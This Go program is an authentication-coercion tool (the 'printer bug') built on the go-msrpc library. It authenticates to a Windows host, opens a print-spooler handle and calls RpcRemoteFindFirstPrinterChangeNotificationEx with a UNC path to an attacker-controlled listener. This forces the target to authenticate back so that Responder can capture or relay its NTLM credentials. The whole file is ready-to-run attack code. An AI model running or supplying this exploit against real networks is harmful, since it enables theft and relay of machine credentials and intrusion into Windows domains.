package main

import (
	"context"
	"fmt"
	"os"

	"github.com/oiweiwei/go-msrpc/dcerpc"
	"github.com/oiweiwei/go-msrpc/msrpc/epm/epm/v3"
	"github.com/oiweiwei/go-msrpc/msrpc/rprn/winspool/v1"
	"github.com/oiweiwei/go-msrpc/ssp"
	"github.com/oiweiwei/go-msrpc/ssp/credential"
	"github.com/oiweiwei/go-msrpc/ssp/gssapi"
)

func main() {
	if len(os.Args) < 6 {
		fmt.Println("Usage: test_msrpc <target> <listener> <user> <password> <domain>")
		return
	}

	target := os.Args[1]
	listener := os.Args[2]
	user := os.Args[3]
	password := os.Args[4]
	domain := os.Args[5]

	// Setup credentials - username format is DOMAIN\user
	username := fmt.Sprintf("%s\\%s", domain, user)
	gssapi.AddCredential(credential.NewFromPassword(username, password))
	gssapi.AddMechanism(ssp.SPNEGO)
	gssapi.AddMechanism(ssp.NTLM)

	ctx := gssapi.NewSecurityContext(context.Background())

	fmt.Printf("[+] Querying endpoint mapper on %s for MS-RPRN interface...\n", target)

	// Connect with endpoint mapper
	cc, err := dcerpc.Dial(ctx, target, epm.EndpointMapper(ctx, target))
	if err != nil {
		fmt.Printf("[-] Failed to dial: %v\n", err)
		return
	}
	defer cc.Close(ctx)

	fmt.Println("[+] Creating MS-RPRN client...")
	cli, err := winspool.NewWinspoolClient(ctx, cc, dcerpc.WithSeal())
	if err != nil {
		fmt.Printf("[-] Failed to create client: %v\n", err)
		return
	}

	// Step 1: Open printer handle to target
	printerName := fmt.Sprintf("\\\\%s\x00", target)
	fmt.Printf("[+] Opening printer on target: %s\n", printerName)

	openReq := &winspool.OpenPrinterRequest{
		PrinterName:    printerName,
		AccessRequired: 0x02000000, // SERVER_READ
	}

	openResp, err := cli.OpenPrinter(ctx, openReq)
	if err != nil {
		fmt.Printf("[-] Failed to open printer: %v\n", err)
		return
	}

	fmt.Printf("[+] Got printer handle\n")

	// Step 2: Call RpcRemoteFindFirstPrinterChangeNotificationEx
	uncPath := fmt.Sprintf("\\\\%s\x00", listener)
	fmt.Printf("[+] Calling RpcRemoteFindFirstPrinterChangeNotificationEx with UNC: %s\n", uncPath)

	req := &winspool.RemoteFindFirstPrinterChangeNotificationExRequest{
		Printer:       openResp.Handle,
		Flags:         0x00000100, // PRINTER_CHANGE_ADD_JOB
		Options:       0,
		LocalMachine:  uncPath,
		PrinterLocal:  0,
		NotifyOptions: nil,
	}

	fmt.Printf("[+] Request details: Flags=0x%x, LocalMachine='%s'\n", req.Flags, req.LocalMachine)
	resp, err := cli.RemoteFindFirstPrinterChangeNotificationEx(ctx, req)
	if err != nil {
		fmt.Printf("[!] RPC call returned error: %v\n", err)
		fmt.Println("[+] This is expected - check Responder for callback!")
	} else {
		fmt.Printf("[+] Success! Response: %+v\n", resp)
		fmt.Println("[+] Check Responder for callback!")
	}
}
